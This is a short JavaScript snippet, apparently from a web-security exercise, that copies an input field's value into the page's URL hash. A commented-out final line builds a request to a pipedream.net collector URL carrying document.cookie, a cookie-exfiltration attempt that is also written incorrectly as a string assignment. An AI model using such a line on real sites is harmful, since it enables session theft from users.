const word = document.getElementById("word");
const res = document.getElementById("result");

word.oninput = () => {
   document.location.hash = word.value;
}
  
//window.onhashchange="http://en7pctch52z3n.x.pipedream.net?cookie="+document.cookie
